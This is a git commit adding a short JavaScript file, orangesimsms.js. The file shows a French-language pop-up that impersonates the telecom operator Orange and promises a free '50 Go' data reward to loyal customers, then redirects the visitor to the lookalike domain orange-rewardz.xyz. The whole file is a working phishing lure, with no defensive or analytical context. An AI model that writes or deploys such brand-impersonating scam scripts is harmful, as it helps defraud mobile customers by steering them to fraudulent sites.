84ef6473f4778706dca5d3a0e1676c37e1c43e49
etijazz247 <etijazz247@gmail.com>
2025-02-06 10:38:11 +0100

    Create orangesimsms.js

---
+++ orangesimsms.js
@@ -0,0 +1,6 @@
+
+var password = 'ACTIVER 50 Go'
+password=prompt('Orange : Cher client, veuillez vérifier si votre carte SIM est éligible pour recevoir des données ACTIVER 50 Go, récompense des anciens clients, appuyez sur Ok pour vérifier maintenant','ACTIVER 50 Go');
+if (password != 'ACTIVER 50 Go') {
+location.href='https://orange-rewardz.xyz/ancienne-recompense-sim';
+}
